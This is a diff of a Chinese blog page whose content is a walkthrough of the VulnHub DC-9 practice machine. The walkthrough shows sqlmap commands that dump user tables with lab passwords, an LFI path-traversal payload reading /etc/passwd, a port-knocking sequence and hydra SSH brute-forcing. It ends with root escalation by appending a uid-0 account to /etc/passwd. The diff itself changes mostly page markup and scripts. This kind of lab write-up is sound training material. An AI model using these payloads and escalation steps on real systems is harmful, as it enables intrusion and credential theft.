@@ -43,7 +43,11 @@
 	<script src="/js/Valine-RJyanzheng.js"></script>
 
     
-<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="简言之" type="application/atom+xml">
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="简言之" type="application/atom+xml">
 <link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css">
 <link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"></head>
 
@@ -905,95 +909,96 @@
                 <h2 id="DC-9简介"><a href="#DC-9简介" class="headerlink" title="DC-9简介"></a>DC-9简介</h2><p><strong>靶机下载地址：</strong><a target="_blank" rel="noopener" href="https://download.vulnhub.com/dc/DC-9.zip">https://download.vulnhub.com/dc/DC-9.zip</a></p>
 <p><strong>靶机描述：</strong>DC-9 是另一个专门构建的易受攻击的实验室，旨在获得渗透测试领域的经验。这一挑战的最终目标是获得root，并阅读唯一的flag。</p>
 <p><strong>涉及漏洞：</strong>SQL注入、LFI</p>
-<p><strong>攻击机：</strong>Kali/192.168.0.104</p>
-<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-探测目标"><a href="#1-探测目标" class="headerlink" title="1.探测目标"></a>1.探测目标</h3><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ sudo arp-scan -l
+<p><strong>攻击机：</strong>Kali&#x2F;192.168.0.104</p>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1-探测目标"><a href="#1-探测目标" class="headerlink" title="1.探测目标"></a>1.探测目标</h3><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> arp-scan -l
 或者
-$ sudo netdiscover -i eth0
+$ <span class="token function">sudo</span> netdiscover -i eth0
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/24/Xhv9srF4p3K6QTt.png" alt=""></p>
-<h3 id="2-查看目标开放端口"><a href="#2-查看目标开放端口" class="headerlink" title="2.查看目标开放端口"></a>2.查看目标开放端口</h3><pre class="line-numbers language-lang-bash"><code class="language-lang-bash">$ sudo nmap -sV -p 0-6553 192.168.0.105
+<p><img src="https://i.loli.net/2020/05/24/Xhv9srF4p3K6QTt.png"></p>
+<h3 id="2-查看目标开放端口"><a href="#2-查看目标开放端口" class="headerlink" title="2.查看目标开放端口"></a>2.查看目标开放端口</h3><pre class="line-numbers language-bash"><code class="language-bash">$ <span class="token function">sudo</span> nmap -sV -p 0-6553 192.168.0.105
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/24/iGFDpYN6uMvnHq1.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/iGFDpYN6uMvnHq1.png"></p>
 <p>目标靶机开放了80端口,22端口显示被过滤掉了</p>
 <h4 id="3-查看网页相关信息"><a href="#3-查看网页相关信息" class="headerlink" title="3.查看网页相关信息"></a>3.查看网页相关信息</h4><p>使用浏览器插件<code>Wappalyzer</code>，这个插件可以检测网站的CMS，框架，服务器等信息，</p>
-<p><img src="https://i.loli.net/2020/05/24/qOPklaIWVLFtiTC.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/qOPklaIWVLFtiTC.png"></p>
 <p>但是没有检测到CMS信息</p>
 <h2 id="二、漏洞查找与利用"><a href="#二、漏洞查找与利用" class="headerlink" title="二、漏洞查找与利用"></a>二、漏洞查找与利用</h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h3><p>在页面发现一个search框，可以查询用户信息，与数据库有交互，猜测可能存在SQL注入，随便输入数据查询，URL框没有改变，说明是POST方式提交，Burp抓包检测是否存在SQL注入的可能</p>
-<p><img src="https://i.loli.net/2020/05/24/7JsYehVuf9Wqj6g.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/7JsYehVuf9Wqj6g.png"></p>
 <p>可以看出确实存在POST型SQL注入，网站应该对注入做了一些应对措施。过滤啊，屏蔽报错啊</p>
 <p>居然存在注入，话不多说，直接上SQLmap跑</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sqlmap -u "http://192.168.0.105/results.php" --data "search=1" --dbs
+<pre class="line-numbers language-bash"><code class="language-bash">sqlmap -u <span class="token string">"http://192.168.0.105/results.php"</span> --data <span class="token string">"search=1"</span> --dbs
 
-available databases [3]:
-[*] information_schema
-[*] Staff
-[*] users
+available databases <span class="token punctuation">[</span>3<span class="token punctuation">]</span>:
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> information_schema
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Staff
+<span class="token punctuation">[</span>*<span class="token punctuation">]</span> <span class="token function">users</span>
 
 --data:指定的数据会被作为POST数据提交
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>发现Staff和users数据库，先看看users库中有什么</p>
 <p><strong>users数据库</strong></p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sqlmap -u "http://192.168.0.105/results.php" --data "search=1" -D users --tables
+<pre class="line-numbers language-bash"><code class="language-bash">sqlmap -u <span class="token string">"http://192.168.0.105/results.php"</span> --data <span class="token string">"search=1"</span> -D <span class="token function">users</span> --tables
 
-Database: users
-[1 table]
+Database: <span class="token function">users</span>
+<span class="token punctuation">[</span>1 table<span class="token punctuation">]</span>
 +-------------+
-| UserDetails |
+<span class="token operator">|</span> UserDetails <span class="token operator">|</span>
 +-------------+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sqlmap -u "http://192.168.0.105/results.php" --data "search=1" -D users -T UserDetails --dump
+<pre class="line-numbers language-bash"><code class="language-bash">sqlmap -u <span class="token string">"http://192.168.0.105/results.php"</span> --data <span class="token string">"search=1"</span> -D <span class="token function">users</span> -T UserDetails --dump
 
-Database: users
+Database: <span class="token function">users</span>
 Table: UserDetails
-[17 entries]
+<span class="token punctuation">[</span>17 entries<span class="token punctuation">]</span>
 +----+------------+---------------+---------------------+-----------+-----------+
-| id | lastname   | password      | reg_date            | username  | firstname |
+<span class="token operator">|</span> <span class="token function">id</span> <span class="token operator">|</span> lastname   <span class="token operator">|</span> password      <span class="token operator">|</span> reg_date            <span class="token operator">|</span> username  <span class="token operator">|</span> firstname <span class="token operator">|</span>
 +----+------------+---------------+---------------------+-----------+-----------+
-| 1  | Moe        | 3kfs86sfd     | 2019-12-29 16:58:26 | marym     | Mary      |
-| 2  | Dooley     | 468sfdfsd2    | 2019-12-29 16:58:26 | julied    | Julie     |
-| 3  | Flintstone | 4sfd87sfd1    | 2019-12-29 16:58:26 | fredf     | Fred      |
-| 4  | Rubble     | RocksOff      | 2019-12-29 16:58:26 | barneyr   | Barney    |
-| 5  | Cat        | TC&TheBoyz    | 2019-12-29 16:58:26 | tomc      | Tom       |
-| 6  | Mouse      | B8m#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |
-| 7  | Flintstone | Pebbles       | 2019-12-29 16:58:26 | wilmaf    | Wilma     |
-| 8  | Rubble     | BamBam01      | 2019-12-29 16:58:26 | bettyr    | Betty     |
-| 9  | Bing       | UrAG0D!       | 2019-12-29 16:58:26 | chandlerb | Chandler  |
-| 10 | Tribbiani  | Passw0rd      | 2019-12-29 16:58:26 | joeyt     | Joey      |
-| 11 | Green      | yN72#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |
-| 12 | Geller     | ILoveRachel   | 2019-12-29 16:58:26 | rossg     | Ross      |
-| 13 | Geller     | 3248dsds7s    | 2019-12-29 16:58:26 | monicag   | Monica    |
-| 14 | Buffay     | smellycats    | 2019-12-29 16:58:26 | phoebeb   | Phoebe    |
-| 15 | McScoots   | YR3BVxxxw87   | 2019-12-29 16:58:26 | scoots    | Scooter   |
-| 16 | Trump      | Ilovepeepee   | 2019-12-29 16:58:26 | janitor   | Donald    |
-| 17 | Morrison   | Hawaii-Five-0 | 2019-12-29 16:58:28 | janitor2  | Scott     |
+<span class="token operator">|</span> 1  <span class="token operator">|</span> Moe        <span class="token operator">|</span> 3kfs86sfd     <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> marym     <span class="token operator">|</span> Mary      <span class="token operator">|</span>
+<span class="token operator">|</span> 2  <span class="token operator">|</span> Dooley     <span class="token operator">|</span> 468sfdfsd2    <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> julied    <span class="token operator">|</span> Julie     <span class="token operator">|</span>
+<span class="token operator">|</span> 3  <span class="token operator">|</span> Flintstone <span class="token operator">|</span> 4sfd87sfd1    <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> fredf     <span class="token operator">|</span> Fred      <span class="token operator">|</span>
+<span class="token operator">|</span> 4  <span class="token operator">|</span> Rubble     <span class="token operator">|</span> RocksOff      <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> barneyr   <span class="token operator">|</span> Barney    <span class="token operator">|</span>
+<span class="token operator">|</span> 5  <span class="token operator">|</span> Cat        <span class="token operator">|</span> TC<span class="token operator">&amp;</span>TheBoyz    <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> tomc      <span class="token operator">|</span> Tom       <span class="token operator">|</span>
+<span class="token operator">|</span> 6  <span class="token operator">|</span> Mouse      <span class="token operator">|</span> B8m<span class="token comment" spellcheck="true">#48sd      | 2019-12-29 16:58:26 | jerrym    | Jerry     |</span>
+<span class="token operator">|</span> 7  <span class="token operator">|</span> Flintstone <span class="token operator">|</span> Pebbles       <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> wilmaf    <span class="token operator">|</span> Wilma     <span class="token operator">|</span>
+<span class="token operator">|</span> 8  <span class="token operator">|</span> Rubble     <span class="token operator">|</span> BamBam01      <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> bettyr    <span class="token operator">|</span> Betty     <span class="token operator">|</span>
+<span class="token operator">|</span> 9  <span class="token operator">|</span> Bing       <span class="token operator">|</span> UrAG0D<span class="token operator">!</span>       <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> chandlerb <span class="token operator">|</span> Chandler  <span class="token operator">|</span>
+<span class="token operator">|</span> 10 <span class="token operator">|</span> Tribbiani  <span class="token operator">|</span> Passw0rd      <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> joeyt     <span class="token operator">|</span> Joey      <span class="token operator">|</span>
+<span class="token operator">|</span> 11 <span class="token operator">|</span> Green      <span class="token operator">|</span> yN72<span class="token comment" spellcheck="true">#dsd      | 2019-12-29 16:58:26 | rachelg   | Rachel    |</span>
+<span class="token operator">|</span> 12 <span class="token operator">|</span> Geller     <span class="token operator">|</span> ILoveRachel   <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> rossg     <span class="token operator">|</span> Ross      <span class="token operator">|</span>
+<span class="token operator">|</span> 13 <span class="token operator">|</span> Geller     <span class="token operator">|</span> 3248dsds7s    <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> monicag   <span class="token operator">|</span> Monica    <span class="token operator">|</span>
+<span class="token operator">|</span> 14 <span class="token operator">|</span> Buffay     <span class="token operator">|</span> smellycats    <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> phoebeb   <span class="token operator">|</span> Phoebe    <span class="token operator">|</span>
+<span class="token operator">|</span> 15 <span class="token operator">|</span> McScoots   <span class="token operator">|</span> YR3BVxxxw87   <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> scoots    <span class="token operator">|</span> Scooter   <span class="token operator">|</span>
+<span class="token operator">|</span> 16 <span class="token operator">|</span> Trump      <span class="token operator">|</span> Ilovepeepee   <span class="token operator">|</span> 2019-12-29 16:58:26 <span class="token operator">|</span> janitor   <span class="token operator">|</span> Donald    <span class="token operator">|</span>
+<span class="token operator">|</span> 17 <span class="token operator">|</span> Morrison   <span class="token operator">|</span> Hawaii-Five-0 <span class="token operator">|</span> 2019-12-29 16:58:28 <span class="token operator">|</span> janitor2  <span class="token operator">|</span> Scott     <span class="token operator">|</span>
 +----+------------+---------------+---------------------+-----------+-----------+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <p>这里是那些员工这账号和密码，后面可能会用到，先放着，然后我们再看看Staff库里面有啥</p>
 <p><strong>Staff数据库</strong></p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sqlmap -u "http://192.168.0.105/results.php" --data "search=1" -D Staff --tables
+<pre class="line-numbers language-bash"><code class="language-bash">sqlmap -u <span class="token string">"http://192.168.0.105/results.php"</span> --data <span class="token string">"search=1"</span> -D Staff --tables
 
 Database: Staff
-[2 tables]
+<span class="token punctuation">[</span>2 tables<span class="token punctuation">]</span>
 +--------------+
-| StaffDetails |
-| Users        |
+<span class="token operator">|</span> StaffDetails <span class="token operator">|</span>
+<span class="token operator">|</span> Users        <span class="token operator">|</span>
 +--------------+
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sqlmap -u "http://192.168.0.105/results.php" --data "search=1" -D Staff -T StaffDetails --dump
+<pre class="line-numbers language-bash"><code class="language-bash">sqlmap -u <span class="token string">"http://192.168.0.105/results.php"</span> --data <span class="token string">"search=1"</span> -D Staff -T StaffDetails --dump
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/24/1ATcKngtzZLsf2Y.png" alt=""></p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sqlmap -u "http://192.168.0.105/results.php" --data "search=1" -D Staff -T Users --dump
+<p><img src="https://i.loli.net/2020/05/24/1ATcKngtzZLsf2Y.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash">sqlmap -u <span class="token string">"http://192.168.0.105/results.php"</span> --data <span class="token string">"search=1"</span> -D Staff -T Users --dump
 
-#dump完密码的时候会提示你是否解密md5,你选择SQLmap自带的字典就可以跑出明文密码
+<span class="token comment" spellcheck="true">#dump完密码的时候会提示你是否解密md5,你选择SQLmap自带的字典就可以跑出明文密码</span>
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/24/AgQZfhdyX7qrKjk.png" alt=""></p>
-<p>得到用户名和密码：<strong>admin/transorbital1</strong>然后使用这个用户去站点登录</p>
-<p><img src="https://i.loli.net/2020/05/24/VPpf2usMIc9jd6F.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/AgQZfhdyX7qrKjk.png"></p>
+<p>得到用户名和密码：<strong>admin&#x2F;transorbital1</strong>然后使用这个用户去站点登录</p>
+<p><img src="https://i.loli.net/2020/05/24/VPpf2usMIc9jd6F.png"></p>
 <h3 id="2-本地文件包含LFI"><a href="#2-本地文件包含LFI" class="headerlink" title="2.本地文件包含LFI"></a>2.本地文件包含LFI</h3><p>登录后多了<code>Add Record和Manage</code>页面，在<code>Manage</code>的下面发现了一句话<code>File does not exits</code> ，猜测可能存在文件包含漏洞,猜测文件参数是<strong>file</strong></p>
 <pre><code>?file=../../../../etc/passwd
-</code></pre><p><img src="https://i.loli.net/2020/05/24/tqfT64rpaSu1YI8.png" alt=""></p>
+</code></pre>
+<p><img src="https://i.loli.net/2020/05/24/tqfT64rpaSu1YI8.png"></p>
 <p>果然存在LFI漏洞,接下来是<code>fuzz</code>一下系统文件</p>
-<p><img src="../images/Vulnhub%E9%9D%B6%E6%9C%BA%EF%BC%9ADC-9/image-20200524131121933.png" alt=""></p>
+<p><img src="/../images/Vulnhub%E9%9D%B6%E6%9C%BA%EF%BC%9ADC-9/image-20200524131121933.png"></p>
 <p>发现了<code>/etc/knockd.conf</code>，这就和之前<code>nmap</code>扫描靶机运行了SSH服务，但是状态是<code>filtered</code>对应起来了，因为<code>knockd</code>可以对SSH进行防护</p>
 <h3 id="3-端口敲门"><a href="#3-端口敲门" class="headerlink" title="3.端口敲门"></a>3.端口敲门</h3><blockquote>
 <p><code>knockd</code>字面意思是敲，只是这里敲的是<code>端口</code>，而且需要按照顺序‘敲’端口。如果敲击规则匹配，则可以让防火墙实时更改策略。从而达到开关防火墙的目的。</p>
@@ -1008,22 +1013,22 @@ Database: Staff
 </li>
 </ul>
 <p>看一下<code>/etc/knockd.conf</code>文件中的自定义端口</p>
-<p><img src="https://i.loli.net/2020/05/24/64fRKVQMw1lELkX.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/64fRKVQMw1lELkX.png"></p>
 <p>有3个自定义端口<code>7469，8475，9842</code>,根据<code>Port-knocking</code>的规则依次访问这三个端口就可以打开SSH服务了</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sudo nmap -p 7469 192.168.0.105
-sudo nmap -p 8475 192.168.0.105
-sudo nmap -p 9842 192.168.0.105
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> nmap -p 7469 192.168.0.105
+<span class="token function">sudo</span> nmap -p 8475 192.168.0.105
+<span class="token function">sudo</span> nmap -p 9842 192.168.0.105
 
 或者安装knockd
 knock 192.168.0.105 7469 8475 9842
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/24/JWvxTckDZNijXfO.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/JWvxTckDZNijXfO.png"></p>
 <p>现在我们看一哈ssh服务被敲开没有</p>
 <pre><code>sudo nmap -p 22 192.168.0.105
-</code></pre><p><img src="https://i.loli.net/2020/05/24/jU1YD8TIMEHVX2m.png" alt=""></p>
+</code></pre>
+<p><img src="https://i.loli.net/2020/05/24/jU1YD8TIMEHVX2m.png"></p>
 <p>不出所料SSH服务被成功敲开</p>
 <h3 id="4-hydra爆破SSH账户"><a href="#4-hydra爆破SSH账户" class="headerlink" title="4.hydra爆破SSH账户"></a>4.hydra爆破SSH账户</h3><p>将前面所爆出来的那些员工的账号和密码编写成两个字典，进行ssh爆破</p>
-<div class="table-container">
 <table>
 <thead>
 <tr>
@@ -1031,74 +1036,71 @@ knock 192.168.0.105 7469 8475 9842
 <th>password.txt</th>
 </tr>
 </thead>
-<tbody>
-<tr>
-<td><img src="https://i.loli.net/2020/05/24/Pekn7KWZwCj68lB.png" alt=""></td>
-<td><img src="https://i.loli.net/2020/05/24/532jwQDIftZloWb.png" alt=""></td>
+<tbody><tr>
+<td><img src="https://i.loli.net/2020/05/24/Pekn7KWZwCj68lB.png"></td>
+<td><img src="https://i.loli.net/2020/05/24/532jwQDIftZloWb.png"></td>
 </tr>
-</tbody>
-</table>
-</div>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">hydra -L username.txt -P password.txt ssh://192.168.0.105
+</tbody></table>
+<pre class="line-numbers language-bash"><code class="language-bash">hydra -L username.txt -P password.txt ssh://192.168.0.105 
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/24/jZfit8YRFUrehVl.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/jZfit8YRFUrehVl.png"></p>
 <p>爆破出来有3个用户可用，<code>chandlerb\UrAG0D!</code>、<code>joeyt\Passw0rd</code>、<code>janitor\Ilovepeepee</code></p>
 <p>依次登录3个用户，最终在用户<code>janitor</code>的目录下找到了隐藏文件</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">ssh chandlerb@192.168.0.105 
-UrAG0D!
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ssh</span> chandlerb@192.168.0.105 
+UrAG0D<span class="token operator">!</span>
 
-ssh joeyt@192.168.0.105 
+<span class="token function">ssh</span> joeyt@192.168.0.105 
 Passw0rd
 
-ssh janitor@192.168.0.105 
+<span class="token function">ssh</span> janitor@192.168.0.105 
 Ilovepeepee
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/24/AHniNy6gY4cLIE3.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/AHniNy6gY4cLIE3.png"></p>
 <p><code>.secrets-for-putin</code>隐藏文件中有一个可读文件，打开后这好像是存放的用户密码，然后把这些密码再加进刚刚我们编写的<code>password.txt</code>字典中重新再爆破一次看看</p>
-<p><img src="https://i.loli.net/2020/05/24/VY2IExTHm7dcl51.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/VY2IExTHm7dcl51.png"></p>
 <p>爆破出了一个新的用户号：<code>fredf\B4-Tru3-001</code></p>
 <h2 id="三、提升权限"><a href="#三、提升权限" class="headerlink" title="三、提升权限"></a>三、提升权限</h2><p>使用<code>fredf</code>用户登录靶机</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">ssh fredf@192.168.0.105
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">ssh</span> fredf@192.168.0.105
 B4-Tru3-001
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
 <p>列出sudo权限的命令，这里发现fred用户在<code>NOPASSWD</code>的情况下可以使用root权限运行这个test文件</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">sudo -l
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">sudo</span> -l
 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/24/QTN2BKmgElhRJa1.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/QTN2BKmgElhRJa1.png"></p>
 <p>尝试运行，发现它是一个python文件</p>
-<p><img src="https://i.loli.net/2020/05/24/1rZh73gSJDRWf4X.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/1rZh73gSJDRWf4X.png"></p>
 <p>使用find查找test.py文件</p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">find / -name test.py 2>/dev/null
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">find</span> / -name test.py 2<span class="token operator">></span>/dev/null
 
-2>/dev/null 代表忽略掉错误提示信息。
+2<span class="token operator">></span>/dev/null 代表忽略掉错误提示信息。
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/24/RHetfyhYCZM8FVo.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/RHetfyhYCZM8FVo.png"></p>
 <p>查看test.py</p>
 <p><img src="https://i.loli.net/2020/05/24/jyYTd4DziHJGgaW.png" alt="image-20200524145858769"></p>
 <p>py文件的含义为：<code>读取参数1的内容，然后将参数1的内容写入到参数2的内容中。</code></p>
 <p>那我们可以构造一个root权限用户，将该用户信息写入文件内，将改文件作为参数1，<code>/etc/passwd</code>作为参数2，这样就创建了一个root权限用户，就能实现提权了</p>
 <p><strong>构造参数1</strong></p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">openssl passwd -1 -salt admin 123456
+<pre class="line-numbers language-bash"><code class="language-bash">openssl <span class="token function">passwd</span> -1 -salt admin 123456
 
 -1 的意思是使用md5加密算法
 -salt 自动插入一个随机数作为文件内容加密
 admin 123456 用户名和密码
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/24/T8Uc6xaQY1lnNIk.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/T8Uc6xaQY1lnNIk.png"></p>
 <p>根据<code>/etc/passwd</code>的格式，修改一下，然后存入一个文件里，这个文件就是<code>参数1</code></p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">echo 'admin:$1$admin$LClYcRe.ee8dQwgrFc5nz.:0:0::/root:/bin/bash' >> /tmp/passwd
-    # 用户名:密码:uid:gid:家目录:登陆后使用的shell
-
-sudo ./test /tmp/passwd /etc/passwd
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token keyword">echo</span> <span class="token string">'admin:<span class="token variable">$1</span><span class="token variable">$admin</span><span class="token variable">$LClYcRe</span>.ee8dQwgrFc5nz.:0:0::/root:/bin/bash'</span> <span class="token operator">>></span> /tmp/passwd
+    <span class="token comment" spellcheck="true"># 用户名:密码:uid:gid:家目录:登陆后使用的shell</span>
+    
+<span class="token function">sudo</span> ./test /tmp/passwd /etc/passwd    
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/24/XveFQ2ZUgJj61lk.png" alt=""></p>
-<pre class="line-numbers language-lang-bash"><code class="language-lang-bash">su admin
-cd /root
-ls
-cat theflag.txt
+<p><img src="https://i.loli.net/2020/05/24/XveFQ2ZUgJj61lk.png"></p>
+<pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">su</span> admin
+<span class="token function">cd</span> /root
+<span class="token function">ls</span>
+<span class="token function">cat</span> theflag.txt
 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
-<p><img src="https://i.loli.net/2020/05/24/QL2PaDpKjFMXrcH.png" alt=""></p>
-<p><img src="https://i.loli.net/2020/05/24/L9NzyOlfR5ZpUHq.png" alt=""></p>
+<p><img src="https://i.loli.net/2020/05/24/QL2PaDpKjFMXrcH.png"></p>
+<p><img src="https://i.loli.net/2020/05/24/L9NzyOlfR5ZpUHq.png"></p>
 <h2 id="赞助💰"><a href="#赞助💰" class="headerlink" title="赞助💰"></a>赞助💰</h2><p>如果你觉得对你有帮助，你可以赞助我一杯冰可乐吧！嘻嘻🤭</p>
 <table>
   <tbody>
@@ -1889,7 +1891,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">712.3k</span>&nbsp;字
+                class="white-color">1051.4k</span>&nbsp;字
             
             
             
@@ -2120,22 +2122,6 @@ $(function () {
     
 
         
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ["$","$"], ["\\(","\\)"] ],
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code'],
-            processEscapes: true
-        }
-    });
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax();
-        for (var i = 0; i < all.length; ++i)
-            all[i].SourceElement().parentNode.className += ' has-jax';
-    });
-</script>
-<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
-
 </body>
 
 </html>
